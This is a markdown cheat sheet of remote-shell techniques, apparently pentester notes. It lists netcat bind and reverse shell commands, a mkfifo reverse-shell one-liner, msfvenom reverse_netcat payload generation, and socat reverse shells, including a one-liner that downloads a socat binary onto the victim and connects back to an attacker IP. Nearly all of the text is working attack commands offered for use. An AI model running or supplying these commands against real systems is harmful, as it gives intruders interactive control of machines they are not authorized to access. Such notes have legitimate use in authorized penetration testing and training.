### Bind/Reverse Shells
#### Bind Shell (don't work behind firewalls)
```
# On Windows machine offer shell
nc -lvp 4444 -e cmd.exe

# On Kali machine connect
nc -nv win.dow.si.p 4444
```
#### Reverse Shell
```
# On Kali Machine listen for connection
nc -lvp 4444

# On target machine
nc -nv att.ac.kin.gip 4444 -e /bin/bash
```
### Improving your Shell
```
# Python
python -c 'import pty; pty.spawn("/bin/sh")'
# Then ctrl-z to background shell and run
stty raw -echo
fg
# It will look ugly but just type the following
reset
# If this shell is the incorrect size for your terminal, type
stty size
# And specify the size
stty -rows 48 -columns 120

# Perl
perl —e 'exec "/bin/sh";'
```
### If using netcat and -e option not available, use this one liner
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
### Improving your Shell with msfvenom one-liners
```
# List the options
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'

# Select and use one
msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.3.4 LPORT=4444 R
```

### Using socat to invoke full interactive shell
```
# On attacking machine, listen with socat
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim machine with socat already installed, replace 10.0.3.4 with attacking ip
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

# On victim machine without socat installed
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

```

### Error opening terminal: 
```
# If getting Error opening terminal: xterm-256color.
export TERM=xterm
```
